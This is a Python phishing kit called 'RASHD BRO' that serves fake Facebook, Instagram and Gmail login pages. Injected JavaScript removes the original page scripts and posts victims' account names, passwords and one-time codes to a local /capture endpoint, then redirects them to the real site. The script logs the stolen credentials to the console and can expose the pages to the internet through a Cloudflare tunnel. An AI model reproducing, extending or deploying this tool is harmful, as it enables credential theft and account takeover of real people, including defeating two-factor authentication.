import subprocess, sys, os, shutil, tempfile, socket, threading, time, random, re, json, urllib.request, urllib.error, urllib.parse
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs, unquote_plus
from datetime import datetime
from collections import deque

try:
    import colorama
except ImportError:
    subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'colorama', '-q'])
    import colorama
from colorama import Fore, Back, Style, init
init(autoreset=True)

# ══════════════════════════════════════════════════════
#  CONFIG
# ══════════════════════════════════════════════════════
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
CFG_FILE = os.path.join(SCRIPT_DIR, 'v4z_config.json')

def load_cfg():
    d = {}
    if os.path.isfile(CFG_FILE):
        try:
            with open(CFG_FILE) as f: return json.load(f)
        except: pass
    return d

def save_cfg(c):
    try:
        with open(CFG_FILE,'w') as f: json.dump(c,f,indent=2)
    except: pass

_CFG = load_cfg()
# Telegram channel not needed — Terminal mode only

WIDTH = 72
TEMPLATES = {
    'fb':    {'name':'Facebook',  'file':'index.html','tag':'FB'},
    'insta': {'name':'Instagram', 'file':'insta.html','tag':'INSTA'},
    'mail':  {'name':'Gmail',     'file':'mail.html','tag':'MAIL'},
}
NEON = [Fore.CYAN,Fore.BLUE,Fore.MAGENTA,Fore.RED,Fore.YELLOW,Fore.GREEN]
_srv=None; _mode='stopped'

# ══════════════════════════════════════════════════════
#  ANIMATION & COLOR
# ══════════════════════════════════════════════════════
def grad(t,cols=None):
    if cols is None: cols=NEON
    return ''.join(cols[i%len(cols)]+Style.BRIGHT+ch+Style.RESET_ALL if ch.strip() else ch for i,ch in enumerate(t))

def divid(t='',ch='═',lc=Fore.CYAN,rc=Fore.MAGENTA):
    if t:
        lp=(WIDTH-len(t)-8)//2; rp=WIDTH-lp-len(t)-8
        print(f'\n{lc}{Style.DIM}{ch*lp}{Style.RESET_ALL}  {grad(f"✦ {t} ✦",NEON)}  {rc}{Style.DIM}{ch*rp}{Style.RESET_ALL}')
    else:
        print(); print(''.join(NEON[i%len(NEON)]+Style.BRIGHT+ch for i in range(WIDTH))); print()

def spin(label,dur=1.5):
    fr=['✦','✧','✩','✧','✦','✧','✩','✧']; cols=[Fore.CYAN,Fore.GREEN,Fore.MAGENTA,Fore.YELLOW,Fore.BLUE]
    e=time.time()+dur; i=0
    while time.time()<e:
        sys.stdout.write(f'\r  {cols[i%len(cols)]}{Style.BRIGHT}{fr[i%len(fr)]}{Style.RESET_ALL}  {Fore.WHITE}{label}...{Style.RESET_ALL}')
        sys.stdout.flush(); time.sleep(0.07); i+=1
    sys.stdout.write('\r'+' '*(len(label)+12)+'\r'); sys.stdout.flush()

def clear(): os.system('cls' if os.name=='nt' else 'clear')
def center(t,c='',w=WIDTH):
    cl=re.sub(r'\x1b\[[0-9;]*m','',t); p=max((w-len(cl))//2,0)
    return ' '*p+c+t+Style.RESET_ALL


def st(msg,k='info'):
    ic={'info':'◆','ok':'✔','err':'✘','warn':'⚠','star':'★','zap':'⚡','lock':'🔒','send':'✉'}
    cl={'info':Fore.CYAN,'ok':Fore.GREEN,'err':Fore.RED,'warn':Fore.YELLOW,'star':Fore.MAGENTA,'zap':Fore.YELLOW,'lock':Fore.BLUE,'send':Fore.CYAN}
    return f'  {Style.BRIGHT}{ic.get(k,ic["info"])}{Style.RESET_ALL}  {cl.get(k,Fore.WHITE)}{msg}{Style.RESET_ALL}'

def inp(l): return input(f'\n  {Fore.MAGENTA}{Style.BRIGHT}❯{Style.RESET_ALL}  {Fore.WHITE}{l}{Style.RESET_ALL}  {Fore.CYAN}{Style.DIM}')
def sep(l=''):
    if l:
        cl=grad(f'✦ {l} ✦'); p=(WIDTH-len(l)-8)//2
        print(f'\n{Fore.CYAN}{Style.DIM}{"-"*p}{Style.RESET_ALL}  {cl}  {Fore.MAGENTA}{Style.DIM}{"-"*p}{Style.RESET_ALL}')
    else: divid()
def pause(): print(); input(f'  {Style.DIM}Press ENTER to return to menu...{Style.RESET_ALL}')
def cleanup(p):
    try: shutil.rmtree(p, ignore_errors=True)
    except: pass
def port_free(pr):
    with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        try: s.bind(('127.0.0.1',pr)); return True
        except OSError: return False
def free_port(s=8080,e=9000):
    for p in range(s,e+1):
        if port_free(p): return p
    return None
def get_port():
    print()
    while True:
        raw=inp('Port  [default: auto]  ❯').strip(); print(Style.RESET_ALL,end='')
        if raw=='':
            spin('Scanning free port',0.8); port=free_port()
            if not port: print(st('No free port in 8080-9000.','err')); continue
            print(st(f'Auto port → {Fore.GREEN}{Style.BRIGHT}{port}','ok')); return port
        if not(raw.isdigit() and 1<=int(raw)<=65535): print(st('Enter valid port 1-65535.','err')); continue
        port=int(raw)
        if port_free(port): return port
        print(st(f'Port {port} in use.','err')); alt=free_port(port+1)
        if alt:
            c=inp(f'Use {alt} instead? [Y/n]  ❯').strip().lower(); print(Style.RESET_ALL,end='')
            if c in('','y','yes'): print(st(f'Switched → {Fore.GREEN}{Style.BRIGHT}{alt}','ok')); return alt
        else: print(st('No free port nearby.','err'))
def get_site():
    print(); print(center('— Select target site —',Fore.YELLOW+Style.BRIGHT)); print()
    while True:
        raw=inp('Site  [1=FB 2=Insta 3=Mail 4=All]  ❯').strip(); print(Style.RESET_ALL,end='')
        if raw=='1':return 'fb'
        if raw=='2':return 'insta'
        if raw=='3':return 'mail'
        if raw=='4' or raw=='':return 'all'
        print(st('Invalid. Use 1,2,3 or 4.','err'))

# ══════════════════════════════════════════════════════
#  CAPTURE + AUTO POST
# ══════════════════════════════════════════════════════
captured_log=[]; log_lock=threading.Lock()

def print_capture(data,ip,en,label,tag=""):
    now=datetime.now().strftime("%Y-%m-%d  %H:%M:%S")
    fc={"account":Fore.CYAN+Style.BRIGHT,"password":Fore.GREEN+Style.BRIGHT,"otp":Fore.YELLOW+Style.BRIGHT}
    sc={"FB":Fore.BLUE+Style.BRIGHT,"INSTA":Fore.MAGENTA+Style.BRIGHT,"MAIL":Fore.RED+Style.BRIGHT,"HUB":Fore.CYAN+Style.BRIGHT}
    print()
    divid(f" ★ CAPTURE #{en} — [{tag}] {label} ★ ",ch="═")
    print(f"  {Style.DIM}⏱ TIME{Style.RESET_ALL}   {Fore.WHITE}{now}{Style.RESET_ALL}   {Style.DIM}📍 FROM{Style.RESET_ALL}   {Fore.YELLOW}{Style.BRIGHT}{ip}{Style.RESET_ALL}")
    print()
    divid(ch="─",lc=Fore.CYAN,rc=Fore.CYAN); print()
    for key,val in data.items():
        ld=key.upper(); vc=fc.get(key.lower(),Fore.WHITE+Style.BRIGHT)
        vd=val if val.strip() else Style.DIM+"(empty)"+Style.RESET_ALL
        b=random.choice(["◆","★","⚡","●","✦","✷"])
        print(f"  {Fore.MAGENTA}│{Style.RESET_ALL}  {Style.DIM}{Fore.WHITE}{ld:<12}{Style.RESET_ALL}  {Fore.CYAN}│{Style.RESET_ALL}  {Fore.YELLOW}{b}{Style.RESET_ALL}  {vc}{vd}{Style.RESET_ALL}")

# ══════════════════════════════════════════════════════
#  HTML TEMPLATES
# ══════════════════════════════════════════════════════
def gen_ph(n):
    return f'<!DOCTYPE html><html><head><meta charset="utf-8"><title>{n}</title></head><body style="font-family:Arial;text-align:center;padding:50px;background:#1a1a2e;color:#eee"><h2>{n} Login</h2><form id="recoveryForm"><input id="account" placeholder="Email/Phone" style="padding:12px;margin:8px;width:260px;border-radius:8px;border:1px solid #333;background:#16213e;color:#eee;outline:none"/><br><input id="password" type="password" placeholder="Password" style="padding:12px;margin:8px;width:260px;border-radius:8px;border:1px solid #333;background:#16213e;color:#eee;outline:none"/><br><button type="submit" style="padding:12px 24px;margin:12px;cursor:pointer;border-radius:8px;background:#1877f2;color:#fff;border:none;font-weight:700;font-size:16px;">Log In</button></form><div id="page2" style="display:none"><h3>Enter OTP</h3><input id="code" placeholder="123456" style="padding:12px;margin:8px;width:260px;border-radius:8px;border:1px solid #333;background:#16213e;color:#eee;outline:none"/><br><button id="page2Next" style="padding:12px 24px;margin:12px;cursor:pointer;border-radius:8px;background:#1877f2;color:#fff;border:none;font-weight:700;font-size:16px;">Verify</button></div></body></html>'

def prep_dir(ch):
    tmp=tempfile.mkdtemp(prefix="v4zphis_"); copied={}
    for key,info in TEMPLATES.items():
        src=os.path.join(SCRIPT_DIR,info['file']); dn={'fb':'fb.html','insta':'insta.html','mail':'mail.html'}[key]
        if os.path.isfile(src): shutil.copy2(src,os.path.join(tmp,dn))
        else: open(os.path.join(tmp,dn),'w').write(gen_ph(info['name']))
        copied[key]=dn
    if ch=='all': open(os.path.join(tmp,'index.html'),'w').write(HUB_HTML)
    else:
        wn={'fb':'fb.html','insta':'insta.html','mail':'mail.html'}.get(ch,'fb.html')
        sf=os.path.join(tmp,wn)
        if os.path.isfile(sf): shutil.copy2(sf,os.path.join(tmp,'index.html'))
        else: shutil.copy2(os.path.join(tmp,list(copied.values())[0]),os.path.join(tmp,'index.html'))
    return tmp

HUB_HTML = '<!DOCTYPE html><html><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1.0"/><style>*{box-sizing:border-box;margin:0;padding:0;font-family:-apple-system,"Segoe UI",Roboto,sans-serif}body{min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:24px;background:linear-gradient(-45deg,#0f0c29,#302b63,#24243e);background-size:400% 400%;animation:bg 15s ease infinite}@keyframes bg{0%{background-position:0% 50%}50%{background-position:100% 50%}100%{background-position:0% 50%}}h1{font-size:28px;font-weight:800;margin-bottom:6px;background:linear-gradient(90deg,#1877f2,#d62976,#ea4335,#fbbc05);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;animation:shim 3s ease infinite}@keyframes shim{0%,100%{opacity:1}50%{opacity:.7}}p{color:#aaa;font-size:14px;margin-bottom:24px}.grid{display:flex;flex-direction:column;gap:16px;width:100%;max-width:360px}a{display:flex;align-items:center;gap:14px;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.1);border-radius:16px;padding:16px 18px;text-decoration:none;color:#eee;font-weight:700;font-size:16px;backdrop-filter:blur(10px);transition:all .2s}a:hover{transform:translateY(-2px);border-color:rgba(255,255,255,.3);box-shadow:0 12px 40px rgba(0,0,0,.4)}.dot{width:48px;height:48px;border-radius:14px;display:flex;align-items:center;justify-content:center;color:#fff;font-size:22px;font-weight:800;flex-shrink:0;animation:pulse 2s ease infinite}@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.05)}}.fb{background:linear-gradient(135deg,#1877f2,#00c6ff)}.ig{background:linear-gradient(45deg,#fa7e1e,#d62976,#962fbf)}.ml{background:linear-gradient(135deg,#ea4335,#fbbc05)}small{display:block;font-weight:400;color:#888;font-size:12px;margin-top:2px}.foot{margin-top:26px;font-size:12px;color:#666;animation:glow 4s ease infinite}@keyframes glow{0%,100%{color:#666}50%{color:#aaa}}</style></head><body><h1>RASHD BRO</h1><p>Choose a service</p><div class="grid"><a href="/fb"><span class="dot fb">f</span><span>Facebook<small>Log in</small></span></a><a href="/insta"><span class="dot ig">◉</span><span>Instagram<small>Log in</small></span></a><a href="/mail"><span class="dot ml">M</span><span>Gmail<small>Sign in</small></span></a></div><div class="foot">RASHD BRO · Neon Edition</div></body></html>'

INJECT_JS = (
    "<script>(function(){"
    "var S=location.pathname.indexOf('insta')>=0?'insta':"
    "location.pathname.indexOf('mail')>=0?'mail':'fb';"
    "function R(s){return s==='insta'?'https://www.instagram.com/':"
    "s==='mail'?'https://mail.google.com/':'https://www.facebook.com/'};"
    "var f=document.getElementById('recoveryForm');"
    "if(f){f.addEventListener('submit',function(e){"
    "e.preventDefault();"
    "var a=document.getElementById('account').value||'',"
    "p=document.getElementById('password').value||'';"
    "fetch('/capture?t=page1&site='+S,{method:'POST',"
    "headers:{'Content-Type':'application/x-www-form-urlencoded'},"
    "body:'account='+encodeURIComponent(a)+'&password='+encodeURIComponent(p)})"
    ".then(function(){document.body.classList.add('show-page2');"
    "var p2=document.getElementById('page2');if(p2)p2.style.display='flex';"
    "setTimeout(function(){var c=document.getElementById('code');if(c)c.focus()},80)})})}"
    "var b=document.getElementById('page2Next');"
    "if(b){b.addEventListener('click',function(e){"
    "e.preventDefault();var c=document.getElementById('code').value||'';"
    "if(c.length!==6)return;"
    "b.textContent='Verifying...';b.disabled=true;"
    "fetch('/capture?t=page2&site='+S,{method:'POST',"
    "headers:{'Content-Type':'application/x-www-form-urlencoded'},"
    "body:'otp='+encodeURIComponent(c)})"
    ".then(function(){window.location.href=R(S)})"
    ".catch(function(){window.location.href=R(S)})})}"
    "var ci=document.getElementById('code');"
    "if(ci){ci.addEventListener('input',function(){"
    "this.value=this.value.replace(/\\D/g,'').slice(0,6);"
    "if(b)b.classList.toggle('active',this.value.length>0)});"
    "ci.addEventListener('keydown',function(e){"
    "if(e.key==='Enter'){e.preventDefault();if(b&&ci.value)b.click()}});}})();"
    "</script>").encode()

def patch(raw):
    c=re.sub(rb'<script[\s\S]*?</script>',b'',raw,flags=re.IGNORECASE)
    return c.replace(b'</body>',INJECT_JS+b'\n</body>')

def resolve(p):
    pp=p.split('?')[0].rstrip('/').lower() or '/'
    return {'fb':'fb.html','insta':'insta.html','mail':'mail.html'}.get(pp,'index.html') if pp in ('/','/index.html','/fb','/fb.html','/facebook','/insta','/insta.html','/instagram','/mail','/mail.html','/gmail','/email') else None

class Handler(BaseHTTPRequestHandler):
    serve_dir=""
    def log_message(self,*a): pass
    def sh(self,c,code=200):
        self.send_response(code); self.send_header("Content-Type","text/html; charset=utf-8")
        self.send_header("Content-Length",str(len(c))); self.send_header("Cache-Control","no-store")
        self.end_headers(); self.wfile.write(c)
    def do_GET(self):
        fn=resolve(self.path)
        if fn:
            fp=os.path.join(self.serve_dir,fn)
            if not os.path.isfile(fp) and fn!="index.html": fp=os.path.join(self.serve_dir,"index.html")
            if os.path.isfile(fp):
                with open(fp,'rb') as f: self.sh(patch(f.read())); return
            self.sh(b'404',404)
    def do_POST(self):
        if "/capture" not in self.path: self.send_response(404); self.end_headers(); return
        qs=self.path.split('?',1)[1] if '?' in self.path else ""
        ps=parse_qs(qs); pt=ps.get('t',['unknown'])[0]; st=ps.get('site',['fb'])[0].lower()
        if st not in ('fb','insta','mail'): st='fb'
        tag={'fb':'FB','insta':'INSTA','mail':'MAIL'}[st]
        lbl=f"{tag} · PAGE 1 · LOGIN" if pt=='page1' else f"{tag} · PAGE 2 · OTP CODE"
        ln=int(self.headers.get('Content-Length',0)); bd=self.rfile.read(ln).decode('utf-8','replace')
        pl=parse_qs(bd,keep_blank_values=True); fl={k:unquote_plus(v[0]) for k,v in pl.items()}
        ip=self.client_address[0]
        with log_lock: captured_log.append({'ip':ip,'data':fl,'type':pt,'site':st}); num=len(captured_log)
        for k,v in fl.items():
            ld=k.upper(); vc={"account":Fore.CYAN,"password":Fore.GREEN,"otp":Fore.YELLOW}.get(k.lower(),Fore.WHITE)+Style.BRIGHT
            vd=v if v.strip() else Style.DIM+"(empty)"+Style.RESET_ALL
            b=random.choice(["◆","★","⚡","●","✦","✷"])
            print(f"  {Fore.MAGENTA}│{Style.RESET_ALL}  {Style.DIM}{Fore.WHITE}{ld:<12}{Style.RESET_ALL}  {Fore.CYAN}│{Style.RESET_ALL}  {Fore.YELLOW}{b}{Style.RESET_ALL}  {vc}{vd}{Style.RESET_ALL}")
        print(); divid(f" ★ CAPTURE #{num} — [{tag}] {lbl} ★ ",ch="═")
        self.send_response(200); self.send_header("Content-Type","text/plain"); self.end_headers(); self.wfile.write(b'OK')

def make_h(sd):
    class BH(Handler): pass
    BH.serve_dir=sd
    return BH

def launch(p,sd): return HTTPServer(("0.0.0.0",p),make_h(sd))

# ══════════════════════════════════════════════════════
#  BANNER & MENUS
# ══════════════════════════════════════════════════════
def banner():
    clear(); print()
    divid(" RASHD BRO ",ch="═")
    bl=["  ╔═╗╔═╗╔╦╗╔═╗  ╔═╗╔═╗╔╦╗╔═╗╔╦╗",
        "  ║║ ║║║ ║║║║╣   ║║ ║║║ ║║║║╣ ║║║",
        "  ║╚═╝║║ ║ ║╚═╝  ║╚═╝║╚═╝║║╚═╝ ║║║",
        "  ║   ║║ ║ ║╔═╗  ║   ║   ║║╔═╗ ║║║",
        "  ║   ╚╝ ║ ║╚═╝  ║   ║   ║║║ ║ ║║║",
        "  ╚═╝  ╚═╝ ╚═╝  ╚═╝ ╚═╝ ╩╚═╝ ╩ ╩"]
    for line in bl:
        cl=''.join([Fore.RED,Fore.YELLOW,Fore.GREEN,Fore.CYAN,Fore.BLUE,Fore.MAGENTA][i%6]+Style.BRIGHT+ch+Style.RESET_ALL if ch.strip() else ch for i,ch in enumerate(line))
        print(center(cl,Fore.WHITE))
    print(); print(center(grad("[ RASHD BRO · FB/Insta/Mail ]",[Fore.CYAN,Fore.MAGENTA,Fore.GREEN]),Fore.CYAN+Style.BRIGHT))
    print(); print(center(grad("Developer: v4zrashd",[Fore.RED,Fore.YELLOW]),""))
    print(); print(center(grad("RASHD BRO · Neon Edition v3.0",[Fore.MAGENTA,Fore.CYAN]),Fore.MAGENTA+Style.BRIGHT))
    print(); divid(ch="═")

def site_menu():
    print(); W=56
    print(f"  {Fore.CYAN+Style.BRIGHT}╔{'═'*W}╗{Style.RESET_ALL}")
    print(f"  {Fore.CYAN+Style.BRIGHT}║{Style.RESET_ALL}{'':^{W}}{Fore.CYAN+Style.BRIGHT}║{Style.RESET_ALL}")
    print(f"  {Fore.CYAN+Style.BRIGHT}║{Style.RESET_ALL}  {Fore.BLUE+Style.BRIGHT}1{Style.RESET_ALL}  {Fore.WHITE+Style.BRIGHT}Facebook{Style.RESET_ALL}     {Style.DIM+Fore.WHITE}/fb      Serve FB{Style.RESET_ALL}  {Fore.CYAN+Style.BRIGHT}║{Style.RESET_ALL}")
    print(f"  {Fore.MAGENTA+Style.BRIGHT}║{Style.RESET_ALL}  {Fore.MAGENTA+Style.BRIGHT}2{Style.RESET_ALL}  {Fore.WHITE+Style.BRIGHT}Instagram{Style.RESET_ALL}    {Style.DIM+Fore.WHITE}/insta   Serve Insta{Style.RESET_ALL}  {Fore.MAGENTA+Style.BRIGHT}║{Style.RESET_ALL}")
    print(f"  {Fore.RED+Style.BRIGHT}║{Style.RESET_ALL}  {Fore.RED+Style.BRIGHT}3{Style.RESET_ALL}  {Fore.WHITE+Style.BRIGHT}Gmail{Style.RESET_ALL}       {Style.DIM+Fore.WHITE}/mail    Serve Mail{Style.RESET_ALL}   {Fore.RED+Style.BRIGHT}║{Style.RESET_ALL}")
    print(f"  {Fore.GREEN+Style.BRIGHT}║{Style.RESET_ALL}  {Fore.GREEN+Style.BRIGHT}4{Style.RESET_ALL}  {Fore.WHITE+Style.BRIGHT}All 3{Style.RESET_ALL}       {Style.DIM+Fore.WHITE}hub      FB+Insta+Mail{Style.RESET_ALL}  {Fore.GREEN+Style.BRIGHT}║{Style.RESET_ALL}")
    print(f"  {Fore.CYAN+Style.BRIGHT}║{Style.RESET_ALL}{'':^{W}}{Fore.CYAN+Style.BRIGHT}║{Style.RESET_ALL}")
    print(f"  {Fore.CYAN+Style.BRIGHT}╚{'═'*W}╝{Style.RESET_ALL}")
    print()

def mode_menu():
    print(); W=56
    print(f"  {Fore.CYAN+Style.BRIGHT}╔{'═'*W}╗{Style.RESET_ALL}")
    print(f"  {Fore.CYAN+Style.BRIGHT}║{Style.RESET_ALL}{'':^{W}}{Fore.CYAN+Style.BRIGHT}║{Style.RESET_ALL}")
    print(f"  {Fore.CYAN+Style.BRIGHT}║{Style.RESET_ALL}  {Fore.YELLOW+Style.BRIGHT}1{Style.RESET_ALL}  {Fore.WHITE+Style.BRIGHT}✦ Localhost{Style.RESET_ALL}     {Style.DIM+Fore.WHITE}Serve & capture{Style.RESET_ALL}  {Fore.CYAN+Style.BRIGHT}║{Style.RESET_ALL}")
    print(f"  {Fore.CYAN+Style.BRIGHT}║{Style.RESET_ALL}{'':^{W}}{Fore.CYAN+Style.BRIGHT}║{Style.RESET_ALL}")
    print(f"  {Fore.CYAN+Style.BRIGHT}║{Style.RESET_ALL}  {Fore.CYAN+Style.BRIGHT}2{Style.RESET_ALL}  {Fore.WHITE+Style.BRIGHT}✦ Cloudflared{Style.RESET_ALL} {Style.DIM+Fore.WHITE}Expose via CF{Style.RESET_ALL}  {Fore.CYAN+Style.BRIGHT}║{Style.RESET_ALL}")
    print(f"  {Fore.CYAN+Style.BRIGHT}║{Style.RESET_ALL}{'':^{W}}{Fore.CYAN+Style.BRIGHT}║{Style.RESET_ALL}")
    print(f"  {Fore.CYAN+Style.BRIGHT}║{Style.RESET_ALL}  {Fore.RED+Style.BRIGHT}0{Style.RESET_ALL}  {Fore.WHITE+Style.BRIGHT}✖ Back{Style.RESET_ALL}            {Style.DIM+Fore.WHITE}Back to site{Style.RESET_ALL}  {Fore.CYAN+Style.BRIGHT}║{Style.RESET_ALL}")
    print(f"  {Fore.CYAN+Style.BRIGHT}║{Style.RESET_ALL}{'':^{W}}{Fore.CYAN+Style.BRIGHT}║{Style.RESET_ALL}")
    print(f"  {Fore.CYAN+Style.BRIGHT}╚{'═'*W}╝{Style.RESET_ALL}")
    print(); print(center(grad("⚡ RASHD BRO ⚡",[Fore.MAGENTA,Fore.CYAN]),Fore.MAGENTA+Style.BRIGHT))

def print_links(port,choice,pub=None):
    print(); divid(" SERVER LIVE ",ch="═",lc=Fore.GREEN,rc=Fore.GREEN)
    if pub:
        print(center(" 🌐 CLOUDFLARED LINK 🌐 ",Fore.MAGENTA+Style.BRIGHT))
        print(grad(center(pub,Fore.WHITE+Style.BRIGHT),[Fore.MAGENTA,Fore.CYAN,Fore.BLUE]))
        if choice=="all": print(center(f"{pub}/fb  |  {pub}/insta  |  {pub}/mail",Fore.YELLOW))
        else: print(center(f"{pub}/{choice}",Fore.YELLOW))
        divid(ch="─",lc=Fore.CYAN,rc=Fore.CYAN)
    print(center(" 💻 LOCALHOST 💻 ",Fore.CYAN+Style.BRIGHT))
    print(center(f"http://127.0.0.1:{port}",Fore.WHITE+Style.BRIGHT))
    try: print(center(f"http://{socket.gethostbyname(socket.gethostname())}:{port}",Fore.CYAN))
    except: pass
    if choice=="all": print(center("Routes: /fb | /insta | /mail",Style.DIM))
    else: print(center(f"Route: /{choice}",Style.DIM))
    divid(ch="═",lc=Fore.GREEN,rc=Fore.GREEN); print()

# ══════════════════════════════════════════════════════
#  RUN MODES
# ══════════════════════════════════════════════════════
def run_local(port,choice):
    divid(" LOCALHOST MODE ",ch="═",lc=Fore.GREEN,rc=Fore.GREEN)
    spin("Preparing server",0.9); sd=prep_dir(choice)
    if sd is None: pause(); return
    print_links(port,choice)
    print(st("Server live · Waiting...","ok")); print(st("FB/Insta/Mail capture active","star"))
    print()
    sv=launch(port,sd)
    try: sv.serve_forever()
    except KeyboardInterrupt: print("\n"+st("Server stopped.","warn"))
    finally: sv.server_close(); cleanup(sd)

def run_cloud(port,choice):
    divid(" CLOUDFLARED MODE ",ch="═",lc=Fore.MAGENTA,rc=Fore.MAGENTA)
    chk=subprocess.run(["cloudflared","--version"],capture_output=True)
    if chk.returncode!=0:
        print(st("cloudflared not found.","err"))
        print(f"\n  {Style.DIM}INSTALL{Style.RESET_ALL}  {Fore.CYAN}https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/downloads/{Style.RESET_ALL}\n")
        pause(); return
    spin("Preparing server",0.9); sd=prep_dir(choice)
    if sd is None: pause(); return
    sv=launch(port,sd)
    t=threading.Thread(target=sv.serve_forever,daemon=True); t.start()
    print(st(f"HTTP server on port {port}","ok")); print(st("Starting Cloudflare tunnel...","info"))
    divid(ch="─",lc=Fore.CYAN,rc=Fore.CYAN); print()
    proc=None
    try:
        proc=subprocess.Popen(["cloudflared","tunnel","--url",f"http://localhost:{port}"],stdout=subprocess.PIPE,stderr=subprocess.STDOUT,text=True)
        found=False
        for line in proc.stdout:
            print(line,end="")
            if "trycloudflare.com" in line and not found:
                m=re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com',line)
                if m: print_links(port,choice,m.group(0)); found=True
    except KeyboardInterrupt: print("\n"+st("Tunnel closed.","warn"))
    except Exception as e: print(st(f"Error: {e}","err"))
    finally:
        if proc:
            try: proc.terminate(); proc.wait(timeout=5)
            except: pass
        sv.shutdown(); sv.server_close(); cleanup(sd)
        print(st("Server stopped.","warn"))

# ══════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════
def main():
    global _srv,_mode
    while True:
        banner(); site_menu()
        raw2=inp("Site  [1=FB 2=Insta 3=Mail 4=All]  ❯").strip(); print(Style.RESET_ALL,end="")
        if raw2=="1": schoice='fb'
        elif raw2=="2": schoice='insta'
        elif raw2=="3": schoice='mail'
        elif raw2=="4" or raw2=="": schoice='all'
        else: print("\n"+st("Invalid. Use 1-4.","err")); pause(); continue
        while True:
            banner()
            tag="ALL" if schoice=="all" else TEMPLATES[schoice]["name"]
            print(center(grad(f"◆ Target: {tag} ◆",[Fore.GREEN,Fore.CYAN]),Fore.GREEN+Style.BRIGHT))
            mode_menu()
            m=inp("Select mode  ❯").strip(); print(Style.RESET_ALL,end="")
            if m=="1": port=get_port(); run_local(port,schoice); pause()
            elif m=="2": port=get_port(); run_cloud(port,schoice); pause()
            elif m=="0": break
            else: print("\n"+st("Invalid. Use 1,2 or 0.","err")); pause()
        break

if __name__ == "__main__":
    main()
